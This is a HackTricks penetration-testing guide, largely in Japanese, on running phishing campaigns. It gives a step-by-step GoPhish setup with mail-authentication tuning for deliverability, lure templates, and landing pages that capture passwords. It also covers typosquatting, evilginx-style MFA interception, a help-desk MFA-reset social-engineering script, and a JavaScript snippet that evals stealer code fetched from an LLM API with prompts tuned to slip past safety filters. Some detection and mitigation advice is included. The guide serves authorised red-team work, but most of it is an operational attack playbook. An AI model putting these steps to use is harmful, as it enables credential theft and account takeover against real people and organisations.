# Phishing 手法

{{#include ../../banners/hacktricks-training.md}}

## 方法論

1. 対象のReconを実施
1. 攻撃対象の**victim domain**を選択する。
2. 攻撃対象が使用する基本的なweb列挙を行い、**login portals**を検索してどのポータルを**偽装する**か**決定する**。
3. **OSINT**を使用して**メールを見つける**。
2. 環境を準備
1. フィッシング評価で使用する**ドメインを購入する**
2. **メールサービス**関連のレコードを設定する (SPF, DMARC, DKIM, rDNS)
3. VPSに**gophish**を設定する
3. キャンペーンを準備
1. **メールテンプレート**を準備する
2. 資格情報を盗むための**webページ**を準備する
4. キャンペーンを開始！

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: 元のドメインの重要な**キーワード**を含むドメイン名（例: zelster.com-management.com）。
- **hypened subdomain**: サブドメインのドットをハイフンに変更（例: www-zelster.com）。
- **New TLD**: 同じドメインで**新しいTLD**を使う（例: zelster.org）
- **Homoglyph**: ドメイン内の文字を**見た目が似ている文字**に置き換える（例: zelfser.com）


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** ドメイン名内の2文字を入れ替える（例: zelsetr.com）。
- **Singularization/Pluralization**: ドメイン名の末尾に「s」を追加または削除（例: zeltsers.com）。
- **Omission**: ドメイン名から1文字を**削除する**（例: zelser.com）。
- **Repetition:** ドメイン名の1文字を**繰り返す**（例: zeltsser.com）。
- **Replacement**: homoglyphに似るがステルス性は低い。ドメイン内の1文字を、元の文字に近いキーボード上の文字などで置き換える（例: zektser.com）。
- **Subdomained**: ドメイン名の中に**ドット**を挿入する（例: ze.lster.com）。
- **Insertion**: ドメイン名に1文字を**挿入する**（例: zerltser.com）。
- **Missing dot**: TLDをドメイン名に追加する（例: zelstercom.com）

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

太陽フレア、宇宙線、ハードウェアのエラーなどの要因により、保存中または通信中のビットが自動的に反転する可能性があります。

この概念をDNS要求に適用すると、DNSサーバーが受け取るドメインが最初に要求したドメインと異なる可能性があります。

例えば、ドメイン "windows.com" の単一ビットの変更により "windnws.com" に変わることがあります。

攻撃者はこれを利用して、被害者のドメインに類似した複数のbit-flippingドメインを登録し、正当なユーザを自分たちのインフラへリダイレクトしようとする場合があります。

詳細は [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/) を参照してください。

### Buy a trusted domain

使用可能なexpired domainを [https://www.expireddomains.net/](https://www.expireddomains.net) で検索できます。\
購入するexpired domainが**既に良好なSEOを持っているか**確認するためには、以下でそのカテゴリを確認できます:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

より多くの有効なメールアドレスを**発見する**か、既に発見したものを**検証する**ために、攻撃対象のSMTPサーバーに対してusername brute-forceが可能か確認できます。[Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
さらに、ユーザがメールにアクセスするための任意の**web portal**を使用している場合、そのポータルが**username brute force**に対して脆弱かどうかを確認し、可能であれば脆弱性を悪用することを忘れないでください。

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

/opt/gophish にダウンロードして解凍し、/opt/gophish/gophish を実行してください。\
実行すると出力にポート3333用の管理者ユーザーのパスワードが表示されます。したがって、そのポートにアクセスして表示された資格情報で管理者パスワードを変更してください。必要に応じてそのポートをローカルにトンネルする必要があります:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### 設定

**TLS証明書の構成**

この手順に進む前に、使用するドメインを**既に購入している**必要があり、またそのドメインが**指している**先は、**VPSのIP**であり、そこが**gophish**を構成している場所である必要があります。
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**メール設定**

インストールを開始： `apt-get install postfix`

次に、ドメインを以下のファイルに追加します：

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf** 内の次の変数の値も変更してください

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

最後に、ファイル **`/etc/hostname`** と **`/etc/mailname`** をあなたのドメイン名に変更し、**VPS を再起動してください。**

次に、VPS の **IP アドレス** を指す `mail.<domain>` の **DNS A record** を作成し、`mail.<domain>` を指す **DNS MX** レコードを作成します。

では、メール送信のテストを行います：
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophishの設定**

gophish の実行を停止して設定しましょう。\
`/opt/gophish/config.json` を次のように変更します（https の使用に注意）：
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish サービスの設定**

gophish サービスを自動起動しサービスとして管理できるようにするには、次の内容で `/etc/init.d/gophish` ファイルを作成してください:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
サービスの設定を完了し、以下の方法で動作確認を行ってください:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## メールサーバーとドメインの設定

### 待つ & 信頼性を保つ

ドメインが古いほど、スパムとして検出される可能性は低くなります。したがって、phishing assessment を行う前にできるだけ長く（少なくとも1週間）待つべきです。さらに、評判に関するページを用意すると、得られる評価は良くなります。

ただし、1週間待つ必要があっても、今すぐにすべての設定を完了できます。

### Configure Reverse DNS (rDNS) record

VPSのIPアドレスがドメイン名に解決されるように、rDNS（PTR）レコードを設定してください。

### Sender Policy Framework (SPF) Record

新しいドメインに対して**SPF レコードを設定する必要があります**。SPF レコードが何かわからない場合は[**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

SPFポリシーを生成するには[https://www.spfwizard.net/](https://www.spfwizard.net)を使用してください（VPSマシンのIPを使用）。

![](<../../images/image (1037).png>)

これはドメイン内のTXTレコードに設定する必要がある内容です:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### ドメインベースのメッセージ認証、レポートおよび適合 (DMARC) レコード

新しいドメインに対して**DMARCレコードを設定する必要があります**。DMARCレコードが何かわからない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)。

ホスト名 `_dmarc.<domain>` を指す新しい DNS TXT レコードを以下の内容で作成してください：
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

新しいドメインに対して **DKIM を設定する必要があります**。DMARC レコードが何かわからない場合は [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)。

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> DKIM キーが生成する両方の B64 値を連結する必要があります:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Test your email configuration score

次のサイトを使って行えます: [https://www.mail-tester.com/](https://www.mail-tester.com/)\ ページにアクセスして、表示されるアドレスにメールを送信してください:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
**メール設定を確認する**には、`check-auth@verifier.port25.com` にメールを送信し、応答を**読む**こともできます（このためには port **25** を**開放**し、root としてメールを送信した場合はファイル _/var/mail/root_ で応答を確認する必要があります）。\
すべてのテストに合格していることを確認してください:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
自分が管理しているGmailに**メッセージを送信**し、Gmailの受信トレイで**メールのヘッダー**を確認すると、`Authentication-Results`ヘッダーフィールドに`dkim=pass`が含まれているはずです。
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Spamhouse Blacklist からの削除

ページ [www.mail-tester.com](https://www.mail-tester.com) で、あなたのドメインが spamhouse によりブロックされているかどうかを確認できます。ドメイン/IP の削除は次でリクエストできます: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklist からの削除

ドメイン/IP の削除は [https://sender.office.com/](https://sender.office.com) でリクエストできます。

## GoPhishキャンペーンの作成と開始

### 送信プロファイル

- 送信プロファイルを識別するための**名前**を設定する
- どのアカウントからphishingメールを送るかを決める。例: _noreply, support, servicedesk, salesforce..._
- ユーザー名とパスワードは空欄のままにしてもよいが、必ず Ignore Certificate Errors にチェックを入れること

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> 動作確認には**Send Test Email**機能を使うことを推奨します。\
> テスト送信はブラックリスト登録を避けるために、**10min mails のアドレス**に送ることをおすすめします。

### メールテンプレート

- テンプレートを識別するための**名前**を設定する
- 次に**subject**を書きます（不自然でない、通常のメールで見かけるような件名にする）
- 必ず**Add Tracking Image**にチェックを入れること
- **メールテンプレート**を書きます（以下の例のように変数を使えます）:
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **in order to increase the credibility of the email**, it's recommended to use some signature from an email from the client. Suggestions:

- Send an email to a **non existent address** and check if the response has any signature.
- Search for **public emails** like info@ex.com or press@ex.com or public@ex.com and send them an email and wait for the response.
- Try to contact **some valid discovered** email and wait for the response

![](<../../images/image (80).png>)

> [!TIP]
> Email Template は **添付ファイルを送信**することも可能です。NTLM challenge を窃取するような特別に細工したファイル/ドキュメントを使いたい場合は、[このページを読む](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)。

### Landing Page

- 名前を入力
- ウェブページの **HTML コードを書く**。ウェブページを **import** できる点に注意してください。
- **Capture Submitted Data** と **Capture Passwords** にチェックを入れる
- **リダイレクト** を設定する

![](<../../images/image (826).png>)

> [!TIP]
> 多くの場合、HTML コードを修正してローカルで（Apache などを使って）テストを繰り返し、満足いく結果が出るまで調整する必要があります。満足したらその HTML コードをボックスに書き込みます。\
> HTML に使用する **静的リソース**（CSS や JS など）が必要な場合は、それらを _**/opt/gophish/static/endpoint**_ に保存してから _**/static/\<filename>**_ で参照できます。

> [!TIP]
> リダイレクト先としては被害者の正規のメインページに **リダイレクト** するか、例えば _/static/migration.html_ に飛ばして **5 秒間のスピニングホイール（**[**https://loading.io/**](https://loading.io)**）を表示した後に処理が成功したと表示する** といった方法が使えます。

### Users & Groups

- 名前を設定
- **Import the data**（テンプレートを利用する例では、各ユーザーの firstname, last name and email address が必要になる点に注意）

![](<../../images/image (163).png>)

### Campaign

最後に、名前、email template、landing page、URL、Sending Profile、group を選択してキャンペーンを作成します。URL は被害者に送られるリンクになります。

Sending Profile は最終的なフィッシングメールがどのように見えるかを確認するために **テストメールを送る** ことを可能にします:

![](<../../images/image (192).png>)

> [!TIP]
> テストを行う際はブラックリスト登録を避けるために **10min mails** のアドレスに送ることをおすすめします。

すべて準備ができたら、キャンペーンを開始してください！

## Website Cloning

何らかの理由でウェブサイトをクローンしたい場合は、次のページを確認してください：


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

一部のフィッシング評価（主に Red Teams）では、**バックドアを含むファイル**（C2 を仕込むものや認証をトリガーするだけのもの）を送信したい場合があります。例については次のページを参照してください：


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

前述の攻撃は、実際のウェブサイトを偽装してユーザーが入力した情報を収集するという点で非常に巧妙です。ただし、ユーザーが正しいパスワードを入力しなかった場合や、あなたが偽装したアプリケーションが 2FA によって保護されている場合、**その情報だけではだまされたユーザーになりすますことはできません**。

ここで [**evilginx2**](https://github.com/kgretzky/evilginx2)**、**[**CredSniper**](https://github.com/ustayready/CredSniper)**、および [**muraena**](https://github.com/muraenateam/muraena) のようなツールが役立ちます。これらのツールは MitM 型の攻撃を実現します。基本的な流れは次のとおりです：

1. 実際のウェブページのログインフォームを**偽装**する。
2. ユーザーが偽ページに**credentials**を送信すると、その情報をツールが実際のウェブページに転送し、**資格情報が有効か確認**する。
3. アカウントが **2FA** を要求する場合、MitM ページはそれを尋ね、ユーザーが入力するとツールはそれを実際のページに送信する。
4. ユーザーが認証されると、攻撃者は**credentials、2FA、cookie、その他のあらゆるやり取りの情報**を取得できる（ツールが MitM を実行している間のすべてのインタラクションが対象）。

### Via VNC

被害者を元のページと同じ見た目の悪意あるページに誘導する代わりに、**ブラウザが実際のウェブページに接続された VNC セッション**に誘導したらどうなるでしょうか？被害者の操作をリアルタイムで観察し、パスワード、MFA、cookie などを盗むことができます。\
これには [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) を利用できます。

## Detecting the detection

発覚したかどうかを知る最良の方法の一つは、**自分のドメインがブラックリストに載っていないか検索する**ことです。リストに載っていれば、何らかの方法であなたのドメインが疑わしいものとして検出されています。\
簡単にブラックリスト掲載の有無を確認する方法の一つは [https://malwareworld.com/](https://malwareworld.com) を使うことです。

ただし、被害者が **積極的に疑わしいフィッシング活動を監視しているか** を知る他の方法もあります。詳しくは次を参照してください：


{{#ref}}
detecting-phising.md
{{#endref}}

被害者のドメインと非常に似た名前のドメインを購入したり、あなたが管理するドメインの **サブドメイン** に対して被害者のドメインの **キーワードを含む証明書** を生成したりすることができます。被害者がそれらに対していかなる DNS や HTTP の相互作用を行った場合、**被害者が積極的に疑わしいドメインを監視している**ことが分かり、その場合は非常にステルスに行動する必要があります。

### Evaluate the phishing

メールがスパムフォルダに入るか、ブロックされるか、成功するかを評価するには [**Phishious**](https://github.com/Rices/Phishious) を使用してください。

## High-Touch Identity Compromise (Help-Desk MFA Reset)

近年の侵害活動では、フィッシングによるメール誘導を完全に省略し、**サービスデスク／アイデンティティ回復ワークフローを直接狙って MFA を回避**する手法が増えています。攻撃は完全に living-off-the-land：オペレータが有効な資格情報を取得すると、組み込みの管理ツールでピボットし、マルウェアは不要です。

### Attack flow
1. Recon the victim
* LinkedIn、流出データ、公開 GitHub などから個人情報・社内情報を収集。
* 重要なアイデンティティ（役員、IT、財務など）を特定し、パスワード／MFA リセットの**正確なヘルプデスク手順**を列挙。
2. Real-time social engineering
* ターゲットになりすましてヘルプデスクに電話、Teams、チャットで接触（しばしば **spoofed caller-ID** や **cloned voice** を使用）。
* 収集した PII を提示して知識ベースの検証を通過させる。
* エージェントを説得して **MFA シークレットをリセット** させるか、登録された携帯番号に対する **SIM-swap** を実行させる。
3. Immediate post-access actions (≤60 min in real cases)
* 任意の web SSO ポータルを通じて足掛かりを確立。
* 組み込みツールで AD / AzureAD を列挙（バイナリを落とさない）：
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* WMI、PsExec、または既に環境内でホワイトリストされている正規の RMM エージェントを使って横移動。

### Detection & Mitigation
* ヘルプデスクのアイデンティティ回復を **特権操作** と扱い、ステップアップ認証とマネージャ承認を要求する。
* **Identity Threat Detection & Response (ITDR)** / **UEBA** ルールを導入し、以下をアラートする：
  * MFA 方法の変更 + 新しいデバイス／ジオからの認証。
  * 同一プリンシパルの即時の権限昇格（user → admin）。
* ヘルプデスク通話を録音し、リセット前に **既に登録された番号へのコールバック** を義務付ける。
* Just-In-Time (JIT) / Privileged Access を実装し、リセットされたばかりのアカウントが自動的に高権限トークンを継承しないようにする。

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
コモディティなクルーは、ハイタッチ作戦のコストを埋めるため、**検索エンジンや広告ネットワークを配信チャネルに変える**大規模攻撃を行います。

1. **SEO poisoning / malvertising** が `chromium-update[.]site` のような偽の結果を検索広告の上位に押し上げる。
2. 被害者は小さな **first-stage loader**（多くは JS/HTA/ISO）をダウンロードする。Unit 42 が確認した例：
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader はブラウザ cookie や credential DB を exfil し、次に **silent loader** を取得して、リアルタイムで展開するものを決定する：
* RAT（例：AsyncRAT、RustDesk）
* ランサムウェア / wiper
* 永続化コンポーネント（レジストリの Run キー + スケジュールタスク）

### Hardening tips
* 新規登録ドメインをブロックし、検索広告だけでなくメールに対しても **Advanced DNS / URL Filtering** を適用する。
* ソフトウェアのインストールを署名された MSI / ストアパッケージに制限し、`HTA`、`ISO`、`VBS` の実行をポリシーで拒否する。
* ブラウザの子プロセスがインストーラを開く挙動を監視する：
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* first-stage loader によく悪用される LOLBins（例：`regsvr32`、`curl`、`mshta`）をハントする。

---

## AI-Enhanced Phishing Operations
攻撃者は今や **LLM & voice-clone API** を連結して、完全にパーソナライズされた誘い文句とリアルタイムのやり取りを実現しています。

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• ARC/DKIM の異常などを利用して、自動化された送信元からのメッセージであることを示す **動的バナー** を追加する。  
• ハイリスクの電話要求に対しては **音声バイオメトリックなチャレンジフレーズ** を導入する。  
• 周知プログラム内で AI が生成した誘い文句を継続的にシミュレートする — 静的テンプレートは時代遅れです。

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

攻撃者は一見無害に見える HTML を配信し、実行時に **trusted LLM API** に JavaScript を要求してブラウザ内で実行（例：`eval` や動的な `<script>`）することで、その場で stealer を生成できます。

1. **Prompt-as-obfuscation:** プロンプト内に exfil URLs/Base64 文字列をエンコードし、安全フィルタを回避するために文言を反復して調整する。
2. **Client-side API call:** ロード時に JS が公開 LLM（Gemini/DeepSeek/etc.）や CDN プロキシに API コールを行う。静的 HTML にはプロンプト／API コールのみが含まれる。
3. **Assemble & exec:** レスポンスを連結して実行する（訪問ごとにポリモーフィック）。
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** 生成された code が誘いを個別化（例：LogoKit token parsing）し、creds を prompt-hidden endpoint に POST する。

**回避特性**
- トラフィックはよく知られた LLM domains や信頼できる CDN proxies に到達することが多く、場合によっては WebSockets を介して backend に接続する。
- 静的な payload はなく、悪意のある JS はレンダー後にのみ存在する。
- 非決定的な生成により、セッションごとに **固有の** stealers が作られる。

**検出のアイデア**
- JS を有効にしたサンドボックスを実行し、**runtime `eval`/dynamic script creation sourced from LLM responses** をフラグする。
- フロントエンドから LLM APIs への POST が行われ、その直後に返却テキストに対して `eval`/`Function` が行われるケースを検出する。
- クライアントトラフィック内の承認されていない LLM domains と、それに続く credential POSTs を検知したらアラートを出す。

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
古典的な push-bombing に加え、オペレータはヘルプデスクの通話中に単に **force a new MFA registration** を行い、ユーザの既存の token を無効化する。その後のログインプロンプトは被害者にとって正当なものに見える。
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor for AzureAD/AWS/Okta events where **`deleteMFA` + `addMFA`** occur **within minutes from the same IP**.

## Clipboard Hijacking / Pastejacking

Attackers can silently copy malicious commands into the victim’s clipboard from a compromised or typosquatted web page and then trick the user to paste them inside **Win + R**, **Win + X** or a terminal window, executing arbitrary code without any download or attachment.

{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Mobile‑gated phishing to evade crawlers/sandboxes
オペレーターは、phishing フローを簡単な device check の背後に置くことが増えており、desktop crawlers が最終ページに到達しないようにしています。一般的なパターンは、タッチ対応の DOM をテストして結果を server endpoint に post する小さなスクリプトで、non‑mobile クライアントには HTTP 500（または空白ページ）が返され、mobile ユーザーには完全なフローが提供されます。

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` ロジック（簡略化）:
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
サーバーのよく観察される挙動:
- 最初の読み込み時にセッション cookie を設定する。
- Accepts `POST /detect {"is_mobile":true|false}`.
- `is_mobile=false` の場合、以降の GET に対して 500（またはプレースホルダ）を返し、`true` の場合のみ phishing を配信する。

ハンティングおよび検出のヒューリスティック:
- urlscan クエリ: `filename:"detect_device.js" AND page.status:500`
- Web テレメトリ: シーケンス `GET /static/detect_device.js` → `POST /detect` → 非モバイルでは HTTP 500；正規のモバイル被害者経路は 200 を返し、その後の HTML/JS を配信する。
- コンテンツを `ontouchstart` や類似のデバイスチェックのみに依存して条件分岐しているページはブロックするか精査する。

防御のヒント:
- モバイルのようなフィンガープリントと JS を有効にしたクローラーを実行して、ゲートされたコンテンツを露出させる。
- 新規登録ドメインで `POST /detect` の後に発生する疑わしい 500 レスポンスに対してアラートを上げる。

## 参考文献

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)

{{#include ../../banners/hacktricks-training.md}}
